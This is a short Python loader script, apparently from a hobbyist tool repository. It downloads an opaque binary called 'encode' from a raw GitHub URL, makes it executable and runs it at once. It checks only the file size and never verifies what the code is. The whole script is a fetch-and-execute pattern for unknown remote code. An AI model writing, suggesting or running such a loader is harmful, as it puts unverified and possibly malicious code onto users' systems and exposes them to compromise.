import os
import requests
import subprocess
from tqdm import tqdm
link = "https://raw.githubusercontent.com/FIRandZAH/FIRZAH/refs/heads/main/encode"
file_name = "encode"
ukuran_ne = 24 * 1024 * 1024 
def unduh(url):
    response = requests.get(url, stream=True)
    total_size = int(response.headers.get('content-length', 0))
    block_size = 1024 
    data = bytearray()
    with tqdm(total=total_size, unit='B', unit_scale=True, desc="Download") as pbar:
        for chunk in response.iter_content(block_size):
            data.extend(chunk)
            pbar.update(len(chunk))
    return bytes(data)
def run_file(file_name):
    os.chmod(file_name, 0o755)
    subprocess.run(["./" + file_name])
if os.path.exists(file_name):
    file_size = os.path.getsize(file_name)
    if file_size >= ukuran_ne:
        run_file(file_name)
    else:
        file_data = unduh(link)
        with open(file_name, "wb") as f:
            f.write(file_data)
        run_file(file_name)
else:
    file_data = unduh(link)
    with open(file_name, "wb") as f:
        f.write(file_data)
    run_file(file_name)
